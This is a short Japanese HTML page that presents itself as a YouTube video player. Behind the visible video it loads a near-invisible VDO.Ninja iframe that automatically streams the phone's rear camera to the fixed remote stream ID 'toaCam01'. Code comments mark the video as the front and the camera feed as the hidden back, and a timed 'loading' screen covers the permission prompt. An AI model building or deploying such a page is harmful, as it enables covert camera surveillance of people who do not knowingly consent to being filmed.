<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow" />
  <title>カメラ起動</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background:#000;
    }

    /* 裏：VDO.Ninja（カメラ配信） */
    iframe#vdo {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: 0;
      opacity: 0.001;
      pointer-events: none;
    }

    /* 表：YouTube表示エリア */
    .overlay {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background:#000;
      color:#fff;
      font-family: system-ui, -apple-system, "Hiragino Sans", "Noto Sans JP", sans-serif;
    }

    /* 横画面っぽいYouTube枠 */
    .video-wrap {
      width: 90vw;
      max-width: 960px;
      aspect-ratio: 16 / 9;
      background:#000;
    }

    .video-wrap iframe {
      width: 100%;
      height: 100%;
      border: 0;
    }

    /* 初動ガード */
    .guard {
      position: fixed;
      inset: 0;
      display:flex;
      align-items:center;
      justify-content:center;
      text-align:center;
      padding:24px;
      background:#000;
      color:#fff;
      z-index: 3;
      line-height:1.8;
      font-size:18px;
      letter-spacing:.02em;
    }
    .guard .note{
      margin-top:12px;
      font-size:13px;
      opacity:.7;
    }
  </style>
</head>
<body>

  <!-- 裏：カメラ配信 -->
  <iframe
    id="vdo"
    allow="camera *; microphone *; autoplay; fullscreen"
    referrerpolicy="no-referrer"
  ></iframe>

  <!-- 表：YouTube -->
  <div class="overlay">
    <div class="video-wrap">
      <iframe
        src="https://www.youtube.com/embed/Vo-771wlTko
          ?autoplay=1
          &mute=1
          &playsinline=1
          &controls=1
          &rel=0"
        title="YouTube video"
        allow="autoplay; encrypted-media; picture-in-picture"
        referrerpolicy="strict-origin-when-cross-origin"
      ></iframe>
    </div>
  </div>

  <!-- 最初だけ黒ガード -->
  <div class="guard" id="guard">
    <div>
      読み込み中…<br>
      このままの画面でお待ちください。
      <div class="note">※スマホをスリープ状態にしないでください。</div>
    </div>
  </div>

  <script>
    const STREAM_ID = "toaCam01";

    const vdoSrc =
      "https://vdo.ninja/?" +
      "push=" + encodeURIComponent(STREAM_ID) +
      "&webcam" +
      "&autostart" +
      "&facing=rear" +
      "&cleanoutput" +
      "&hidehome" +
      "&transparent";

    document.getElementById("vdo").src = vdoSrc;

    // 許可ダイアログ時間を確保
    setTimeout(() => {
      const g = document.getElementById("guard");
      if (g) g.style.display = "none";
    }, 2500);
  </script>
</body>
</html>
